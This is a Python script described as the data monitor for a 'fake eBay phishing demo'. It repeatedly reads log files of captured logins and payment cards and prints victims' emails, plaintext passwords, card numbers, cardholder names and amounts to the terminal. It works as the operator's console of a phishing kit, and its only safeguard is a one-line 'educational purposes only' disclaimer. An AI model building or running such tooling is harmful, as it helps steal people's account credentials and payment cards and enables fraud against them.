#!/usr/bin/env python3
"""
Data Monitor for Fake eBay Phishing Demo
Shows captured login and payment data in real-time
"""

import os
import json
import time
from datetime import datetime

def read_log_file(filename):
    """Read and parse log file"""
    data = []
    if os.path.exists(f"data/{filename}"):
        with open(f"data/{filename}", "r") as f:
            for line in f:
                try:
                    data.append(json.loads(line.strip()))
                except json.JSONDecodeError:
                    continue
    return data

def display_data():
    """Display captured data in a formatted way"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("=" * 80)
    print("🚨 FAKE EBAY PHISHING DEMO - DATA MONITOR")
    print("=" * 80)
    print(f"Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    # Read login data
    logins = read_log_file("logins.txt")
    print(f"📧 LOGIN ATTEMPTS CAPTURED: {len(logins)}")
    print("-" * 40)
    
    for entry in logins[-5:]:  # Show last 5 entries
        timestamp = entry.get("timestamp", "Unknown")
        data = entry.get("data", {})
        email = data.get("email", "Unknown")
        password = data.get("password", "Unknown")
        print(f"[{timestamp}] Email: {email} | Password: {password}")
    
    print()
    
    # Read payment data
    payments = read_log_file("cards.txt")
    print(f"💳 PAYMENT ATTEMPTS CAPTURED: {len(payments)}")
    print("-" * 40)
    
    for entry in payments[-5:]:  # Show last 5 entries
        timestamp = entry.get("timestamp", "Unknown")
        data = entry.get("data", {})
        card_number = data.get("card_number", "Unknown")
        cardholder = data.get("cardholder_name", "Unknown")
        total = data.get("total_amount", 0)
        print(f"[{timestamp}] Card: {card_number} | Name: {cardholder} | Amount: ${total}")
    
    print()
    print("=" * 80)
    print("Press Ctrl+C to exit")
    print("=" * 80)

def main():
    """Main monitoring loop"""
    print("Starting data monitor...")
    print("This will show captured login and payment data in real-time")
    print("Press Ctrl+C to exit")
    print()
    
    try:
        while True:
            display_data()
            time.sleep(2)  # Update every 2 seconds
    except KeyboardInterrupt:
        print("\n\nMonitoring stopped.")
        print("Remember: This is for educational purposes only!")

if __name__ == "__main__":
    main() 